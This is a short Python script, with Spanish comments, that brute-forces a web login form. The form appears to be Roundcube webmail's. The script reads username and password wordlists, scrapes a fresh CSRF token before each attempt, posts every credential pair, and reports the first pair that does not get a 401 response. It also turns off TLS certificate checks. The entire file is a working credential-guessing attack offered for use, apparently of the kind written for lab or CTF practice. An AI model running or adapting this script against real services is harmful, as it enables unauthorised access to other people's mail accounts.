#!/usr/bin/python3 

from pwn import *
from bs4 import BeautifulSoup
import sys, time, pdb, requests, signal, urllib3

# Desactivar las advertencias de urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) < 4:
        print("[!] Use: "+ sys.argv[0] + "<target-url> userlist.txt passwordlist.txt")
        sys.exit(1)

def signal_handler(sig, frame):
        print("\n\n[!] Exiting \n")
        sys.exit(0)

url = sys.argv[1]
argument_1 = sys.argv[2]
argument_2 = sys.argv[3]


p1 = log.progress("Brute Force")
p2 = log.progress("Valid User")
p3 = log.progress("Valid Pass")
p4 = log.progress("Token")
p5 = log.progress("Response code")

#Ctrl+C
signal.signal(signal.SIGINT, signal_handler)






def bruteforce():
        response = requests.get(url, verify=False)           #Request inicial para extraer el token
        soup = BeautifulSoup(response.text, 'html.parser')   #Parsea la respuesta a HTML
        token_input = soup.find('input', {'name': '_token'}) #Busca el token 


        userlist = open(argument_1, 'r')
        passlist = open(argument_2, 'r')
        userlines = userlist.readlines()
        passlines = passlist.readlines()


        for user in userlines:
                for passwd in passlines:

                        if token_input:
                                token_value = token_input['value']           # Obtiene el valor del token
                                p4.status("ID: "+token_value)
                        else:
                                print(f'La solicitud GET para obtener el token falló con el código de respuesta: {response.status_code}')
                                sys.exit()


                        parameter_user = user.strip()
                        parameter_pass = passwd.strip()
                        p1.status("Testing Username: "+ parameter_user + " - Testing Password: "+ parameter_pass)
                        data = {
                        '_token': token_value,
                        '_task': 'login',
                        '_action': 'login',
                        '_timezone': 'America/New_York',
                        '_url': '',
                        '_user': parameter_user,
                        '_pass': parameter_pass
                        }

                        response = requests.post(url, data=data, verify=False)
                        response2 = requests.get(url, verify=False)          #Request inicial para extraer el token
                        soup = BeautifulSoup(response2.text, 'html.parser')   #Parsea la respuesta a HTML
                        token_input = soup.find('input', {'name': '_token'}) #Busca el token 
                        p5.status(response.status_code)

                        if response.status_code != 401:
                                valid_username = parameter_user
                                valid_password = parameter_pass
                                p2.status(valid_username)
                                p3.status(valid_password)
                                sys.exit()



if __name__ == '__main__':
        bruteforce()
